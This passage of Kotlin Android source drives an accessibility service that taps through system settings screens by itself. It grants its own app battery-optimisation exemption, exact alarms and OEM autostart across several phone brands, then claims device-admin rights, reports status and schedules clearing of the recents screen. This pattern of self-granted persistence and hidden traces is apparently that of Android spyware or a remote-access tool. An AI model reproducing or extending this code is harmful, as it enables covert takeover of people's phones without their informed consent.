                        BackgroundAccess.openSamsungBatteryHub(activity)
                    }
                    waitForOemUiThenKickAi(0)
                }, 600L)
                return
            }
            PermissionDialogTapper.OemSurface.HUB -> {
                if (oemNavSteps < 10 && PermissionDialogTapper.advanceOemHub(svc)) {
                    oemNavSteps++
                    AutoGrantTiming.i("OEM hub step=$oemNavSteps")
                    main.postDelayed({ waitForOemUiThenKickAi(0) }, 700L)
                    return
                }
                if (attempt < 8) {
                    main.postDelayed({ waitForOemUiThenKickAi(attempt + 1) }, 400L)
                    return
                }
                PermissionDialogTapper.logOemHubMiss(svc)
                if (!oemAppInfoTried) {
                    oemAppInfoTried = true
                    oemNavSteps = 0
                    PermissionDialogTapper.resetOemListScroll()
                    AutoGrantTiming.i("OEM hub exhausted — fallback app details")
                    if (BackgroundAccess.openApplicationDetails(activity)) {
                        main.postDelayed({ waitForOemUiThenKickAi(0) }, 700L)
                        return
                    }
                }
                giveUpOem(activity, "hub did not reach app list")
                return
            }
            PermissionDialogTapper.OemSurface.APP_LIST -> {
                if (PermissionDialogTapper.shouldTapOemAdd(svc) &&
                    oemNavSteps < 8 &&
                    PermissionDialogTapper.advanceOemHub(svc)
                ) {
                    oemNavSteps++
                    AutoGrantTiming.i("OEM add-app step=$oemNavSteps")
                    main.postDelayed({ waitForOemUiThenKickAi(0) }, 700L)
                    return
                }
                AutoGrantTiming.i("OEM UI+list ready attempt=$attempt → AI")
                PermissionDialogTapper.resetAiForceSchedule()
                PermissionDialogTapper.scheduleForceAi(svc, delayMs = 40L, force = true)
                return
            }
            PermissionDialogTapper.OemSurface.UNKNOWN -> {
                val pkg = topForeignPackage(svc).lowercase()
                val pkgReady = pkg.contains("securitycenter") ||
                    pkg.contains("safecenter") ||
                    pkg.contains("autostart") ||
                    pkg.contains("startup") ||
                    pkg.contains("permissionmanager") ||
                    pkg.contains("systemmanager")
                if (pkgReady && attempt >= 6) {
                    AutoGrantTiming.i("OEM UI pkg ready but list thin — nudge scroll attempt=$attempt")
                    PermissionDialogTapper.scrollByGuide(svc, forward = true)
                }
                if (attempt >= 24) {
                    if (pkg.contains("settings") && oemNavBacks < 2) {
                        oemNavBacks++
                        AutoGrantTiming.i("OEM still on settings dialog — back #$oemNavBacks")
                        svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
                        main.postDelayed({ waitForOemUiThenKickAi(0) }, 500L)
                        return
                    }
                    if (pkg.contains("lool") || pkg.contains("samsung.android.sm")) {
                        giveUpOem(activity, "samsung page is not an app list")
                        return
                    }
                    if (pkg.isBlank()) {
                        giveUpOem(activity, "OEM UI not found")
                        return
                    }
                    AutoGrantTiming.w("OEM UI wait exhausted pkg=$pkg — kick AI anyway")
                    PermissionDialogTapper.resetAiForceSchedule()
                    PermissionDialogTapper.scheduleForceAi(svc, delayMs = 40L, force = true)
                    return
                }
                main.postDelayed({ waitForOemUiThenKickAi(attempt + 1) }, 350L)
            }
        }
    }

    private fun topForeignPackage(svc: AccessibilityService): String {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val windows = svc.windows
            if (!windows.isNullOrEmpty()) {
                for (w in windows) {
                    val pkg = runCatching { w.root?.packageName?.toString().orEmpty() }.getOrDefault("")
                    if (pkg.isNotBlank() && pkg != svc.packageName && isForeignSettingsPkg(pkg)) {
                        return pkg
                    }
                }
            }
        }
        return runCatching {
            svc.rootInActiveWindow?.packageName?.toString().orEmpty()
        }.getOrDefault("")
    }

    private fun waitForBatteryGrantThenAdvance(activity: Activity, attempt: Int) {
        if (host !== activity || phase != Phase.BATTERY) return
        if (BackgroundAccess.isIgnoringBatteryOptimizations(activity)) {
            AutoGrantTiming.i("SUCCESS battery unrestricted (after AI, attempt=$attempt)")
            UiGuideBridge.abortStale("battery granted")
            PermissionDialogTapper.noteAiGuideSucceeded()
            if (awaitingReturn) {
                completeSettingsReturn(activity, alreadyLoggedGrant = true)
            } else if (!oemOpened && phase == Phase.BATTERY) {
                // poll قبلاً awaiting را بسته — فقط اگر هنوز روی BATTERY هستیم جلو برو
                phase = Phase.EXACT_ALARM
                advance(activity)
            }
            return
        }
        if (attempt >= 24) {
            AutoGrantTiming.w("battery AI finished but grant not visible yet — poll continues")
            return
        }
        main.postDelayed({ waitForBatteryGrantThenAdvance(activity, attempt + 1) }, 120L)
    }

    private fun waitForAlarmGrantThenAdvance(activity: Activity, attempt: Int) {
        if (host !== activity || phase != Phase.EXACT_ALARM) return
        if (BackgroundAccess.canScheduleExactAlarms(activity)) {
            AutoGrantTiming.i("SUCCESS exact alarm (after AI, attempt=$attempt)")
            UiGuideBridge.abortStale("alarm granted")
            PermissionDialogTapper.noteAiGuideSucceeded()
            if (awaitingReturn) {
                completeSettingsReturn(activity, alreadyLoggedGrant = true)
            } else if (!oemOpened && phase == Phase.EXACT_ALARM) {
                phase = Phase.OEM_AUTOSTART
                advance(activity)
            }
            return
        }
        if (attempt >= 24) {
            AutoGrantTiming.w("alarm AI finished but grant not visible yet — poll continues")
            return
        }
        main.postDelayed({ waitForAlarmGrantThenAdvance(activity, attempt + 1) }, 120L)
    }

    /** تا وقتی PowerManager اجازه بدهد یا از Settings برگردیم؛ گیر نکند روی ignoreResume. */
    private fun startSettingsPoll(activity: Activity, expected: Phase) {
        val token = ++settingsPollToken
        val started = SystemClock.uptimeMillis()
        val maxWaitMs = if (AutoGrantDebug.useAi) 22_000L else 14_000L
        fun tick() {
            if (token != settingsPollToken) return
            if (host !== activity || activity.isFinishing) return
            if (phase != expected || !awaitingReturn) return
            when (expected) {
                Phase.BATTERY -> {
                    if (BackgroundAccess.isIgnoringBatteryOptimizations(activity)) {
                        Log.i(TAG, "SUCCESS battery unrestricted (poll)")
                        completeSettingsReturn(activity, alreadyLoggedGrant = true)
                        return
                    }
                }
                Phase.EXACT_ALARM -> {
                    if (BackgroundAccess.canScheduleExactAlarms(activity)) {
                        Log.i(TAG, "SUCCESS exact alarm (poll)")
                        completeSettingsReturn(activity, alreadyLoggedGrant = true)
                        return
                    }
                }
                else -> Unit
            }
            // حین AI یا بلافاصله بعد از tap: فلاش پنجره را FAIL حساب نکن
            val aiHold = AutoGrantDebug.useAi &&
                (UiGuideBridge.isBusy() || SystemClock.uptimeMillis() - started < 4_000L)
            // rootInActiveWindow گاهی لحظه‌ای روی اپ ماست در حالی که PowerKeeper هنوز باز است
            val foreign = isForeignSettingsOnTop()
            if (foreign) {
                settingsGoneTicks = 0
            } else if (!aiHold && SystemClock.uptimeMillis() >= ignoreResumeUntil) {
                settingsGoneTicks++
                // چند تیک پشت‌سرهم بدون پنجرهٔ خارجی → واقعاً برگشتیم
                if (settingsGoneTicks >= 3) {
                    Log.i(TAG, "settings poll: back on app without grant phase=$expected")
                    completeSettingsReturn(activity)
                    return
                }
            }
            if (SystemClock.uptimeMillis() - started > maxWaitMs) {
                // useAi: اگر هنوز AI در پرواز است کمی دیگر صبر
                if (AutoGrantDebug.useAi && UiGuideBridge.isBusy() &&
                    SystemClock.uptimeMillis() - started < maxWaitMs + 8_000L
                ) {
                    main.postDelayed({ tick() }, 400L)
                    return
                }
                Log.w(TAG, "settings poll timeout phase=$expected")
                completeSettingsReturn(activity)
                return
            }
            main.postDelayed({ tick() }, 400L)
        }
        main.postDelayed({ tick() }, 500L)
    }

    private fun isForeignSettingsOnTop(): Boolean {
        val svc = AgentAccessibilityService.get() ?: return false
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val windows = svc.windows
            if (!windows.isNullOrEmpty()) {
                for (w in windows) {
                    val pkg = runCatching {
                        w.root?.packageName?.toString().orEmpty()
                    }.getOrDefault("")
                    if (pkg.isNotBlank() && pkg != svc.packageName && isForeignSettingsPkg(pkg)) {
                        return true
                    }
                }
            }
        }
        val top = runCatching {
            svc.rootInActiveWindow?.packageName?.toString().orEmpty()
        }.getOrDefault("")
        if (top.isBlank() || top == svc.packageName) return false
        return isForeignSettingsPkg(top)
    }

    private fun isForeignSettingsPkg(pkg: String): Boolean {
        val p = pkg.lowercase()
        return p.contains("settings") ||
            p.contains("powerkeeper") ||
            p.contains("securitycenter") ||
            p.contains("permissioncontroller") ||
            p.contains("safecenter") ||
            p.contains("oppoguardelf") ||
            p.contains("systemmanager") ||
            p.contains("samsung.android.lool") ||
            p.contains("samsung.android.sm")
    }

    private fun openExactAlarm(activity: Activity) {
        if (BackgroundAccess.canScheduleExactAlarms(activity)) {
            GrantReporter.sync(activity)
            AutoGrantTiming.i("SUCCESS exact alarm (already) → oem")
            UiGuideBridge.abortStale("alarm already")
            phase = Phase.OEM_AUTOSTART
            advance(activity)
            return
        }
        if (alarmAttempts >= 2) {
            AutoGrantTiming.w("FAIL exact alarm after $alarmAttempts attempts → skip to oem")
            UiGuideBridge.abortStale("alarm skip")
            phase = Phase.OEM_AUTOSTART
            advance(activity)
            return
        }
        alarmAttempts++
        UiGuideBridge.abortStale("open alarm")
        PermissionDialogTapper.clearAiSuccessGate()
        PermissionDialogTapper.resetAiForceSchedule()
        PermissionDialogTapper.mode = TapMode.SETTINGS_SWITCH
        updateOverlay(activity)
        awaitingReturn = true
        settingsGoneTicks = 0
        ignoreResumeUntil = SystemClock.uptimeMillis() + 2_500L
        AutoGrantTiming.i("=====> REQUEST exact alarm (attempt=$alarmAttempts)")
        try {
            val intent = Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            @Suppress("DEPRECATION")
            activity.startActivityForResult(intent, REQ_ALARM)
            startSettingsPoll(activity, Phase.EXACT_ALARM)
            kickAiForPhase(Phase.EXACT_ALARM, delayMs = 280L)
        } catch (t: Throwable) {
            Log.w(TAG, "FAIL exact alarm intent", t)
            awaitingReturn = false
            phase = Phase.OEM_AUTOSTART
            advance(activity)
        }
    }

    private fun openOem(activity: Activity) {
        AutoGrantTiming.i("openOem begin needsOem=${BackgroundAccess.needsOemAutostart()} already=${AutoGrantProgress.isOemGranted(activity)}")
        if (!BackgroundAccess.needsOemAutostart()) {
            AutoGrantTiming.i("SKIP oem autostart (not needed on this brand)")
            phase = Phase.DONE
            finish(activity)
            return
        }
        if (AutoGrantProgress.isOemGranted(activity)) {
            AutoGrantTiming.i("SKIP oem autostart (toggle already confirmed)")
            phase = Phase.DONE
            finish(activity)
            return
        }
        oemSettled = false
        oemAiRounds = 0
        oemNearAppMisses = 0
        oemNavSteps = 0
        oemNavBacks = 0
        oemPickerConfirmed = false
        oemAppInfoTried = false
        UiGuideBridge.abortStale("open oem")
        PermissionDialogTapper.resetOemListScroll()
        PermissionDialogTapper.clearAiSuccessGate()
        PermissionDialogTapper.resetAiForceSchedule()
        PermissionDialogTapper.mode = TapMode.OEM_APP_LIST
        updateOverlay(activity)
        awaitingReturn = true
        ignoreResumeUntil = SystemClock.uptimeMillis() + 2_500L
        AutoGrantTiming.i("=====> REQUEST oem autostart settings (find app + enable toggle)")
        val openStart = SystemClock.uptimeMillis()
        val opened = BackgroundAccess.openAutostartSettings(activity)
        AutoGrantTiming.i("openAutostartSettings opened=$opened openMs=${SystemClock.uptimeMillis() - openStart}")
        if (!opened) {
            giveUpOem(activity, "settings did not open")
            return
        }
        oemOpened = true
        AutoGrantTiming.i("OPENED oem autostart settings — waiting for OEM_APP_LIST toggle")
        kickAiForPhase(Phase.OEM_AUTOSTART, delayMs = if (AutoGrantDebug.useAi) 500L else 500L)
        val oemTimeout = if (AutoGrantDebug.useAi) 45_000L else 18_000L
        main.postDelayed({
            if (host !== activity || activity.isFinishing) return@postDelayed
            if (phase != Phase.OEM_AUTOSTART || oemSettled) return@postDelayed
            if (AutoGrantProgress.isOemGranted(activity)) return@postDelayed
            if (AutoGrantDebug.useAi && UiGuideBridge.isBusy()) {
                main.postDelayed({
                    if (host !== activity || phase != Phase.OEM_AUTOSTART || oemSettled) return@postDelayed
                    if (AutoGrantProgress.isOemGranted(activity)) return@postDelayed
                    giveUpOem(activity, "toggle not confirmed within timeout")
                }, 8_000L)
                return@postDelayed
            }
            giveUpOem(activity, "toggle not confirmed within timeout")
        }, oemTimeout)
    }

    private fun giveUpOem(activity: Activity, reason: String) {
        if (phase != Phase.OEM_AUTOSTART || oemSettled) return
        oemSettled = true
        AutoGrantTiming.w("FAIL oem $reason")
        AutoGrantProgress.markOemGiveUp(activity)
        awaitingReturn = false
        phase = Phase.DONE
        finish(activity)
    }

    private fun finish(activity: Activity) {
        AutoGrantTiming.i("DONE grants — device admin before first action")
        main.removeCallbacksAndMessages(null)
        AutoGrantProgress.markSessionDone(activity)
        PermissionsAutoGrant.disarm(hideOverlay = true)
        LeaveA11ySettings.cancel()
        PermissionDialogTapper.mode = TapMode.IDLE
        PermissionDialogTapper.resetAiForceSchedule()
        index = 0
        awaitingReturn = false
        oemSettled = false
        bringUpLock.set(false)
        if (DeviceAdminClaim.isActive(activity)) {
            completeAfterAdmin(activity)
            return
        }
        phase = Phase.DEVICE_ADMIN
        host = activity
        DeviceAdminClaim.begin(activity)
        // کمی صبر تا صفحهٔ سیستم بیاید؛ بلافاصله فقط systemui دیده می‌شود
        main.postDelayed({ pumpAdmin(activity, SystemClock.uptimeMillis()) }, 800L)
    }

    private fun pumpAdmin(activity: Activity, startedAt: Long) {
        if (host !== activity || phase != Phase.DEVICE_ADMIN) return
        val svc = AgentAccessibilityService.get()
        val ready = svc != null && DeviceAdminClaim.ensureReady(svc)
        val timedOut = SystemClock.uptimeMillis() - startedAt > 45_000L
        if (ready || timedOut || DeviceAdminClaim.isActive(activity)) {
            if (timedOut && !DeviceAdminClaim.isActive(activity)) {
                Log.w(TAG, "device admin timeout — first action continues")
            }
            completeAfterAdmin(activity)
            return
        }
        main.postDelayed({ pumpAdmin(activity, startedAt) }, 500L)
    }

    private fun completeAfterAdmin(activity: Activity) {
        host = null
        phase = Phase.IDLE
        try {
            activity.startActivity(
                Intent(activity, MainActivity::class.java).addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_CLEAR_TOP or
                        Intent.FLAG_ACTIVITY_SINGLE_TOP,
                ),
            )
        } catch (t: Throwable) {
            Log.w(TAG, "bring Main", t)
        }
        if (!activity.isFinishing) activity.finish()
        GrantReporter.sync(activity, forceReady = true)
        RecentsClearer.scheduleAfterSetup(activity)
    }
}
